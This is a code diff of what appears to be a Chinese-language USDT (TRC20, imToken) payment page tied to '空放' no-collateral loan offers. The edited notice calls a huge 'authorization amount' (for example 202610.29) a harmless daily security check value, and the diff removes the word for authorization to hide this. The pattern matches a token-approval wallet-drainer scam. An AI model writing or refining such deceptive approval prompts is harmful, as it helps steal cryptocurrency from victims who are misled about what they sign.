@@ -51,7 +51,7 @@
 
   <!-- 这里是醒目的安全提示框 -->
   <div class="safe-notice">
-    💡 安全提示：授权额度为系统每日动态安全校验值（如：202610.29），仅作校验凭证，实际扣款金额为您上方输入的支付金额。请放心确认。
+    💡 安全提示：系统每日动态安全校验值（如：202610.29），仅作校验凭证，实际扣款金额为您上方输入的支付金额。
   </div>
 
   <button class="btn btn-pay" id="btn-pay" disabled>✅安全支付</button>
@@ -126,8 +126,8 @@ let coldReloadTimer = null;
 $('#info-addr').textContent   = toAddress || '未配置';
 $('#info-chain').textContent  = 'TRC20 (波场)';
 $('#info-amount').textContent = (amount > 0 ? amount : '-') + ' USDT';
-$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '押金充值';
-$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在 imToken 中完成操作';
+$('#page-title').textContent  = type === 'empty' ? '空放邀请码获取' : '押金充值';
+$('#page-sub').textContent    = type === 'empty' ? '激活' : '请在 imToken 中完成操作';
 
 if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
   const tip = $('#recover-tip');
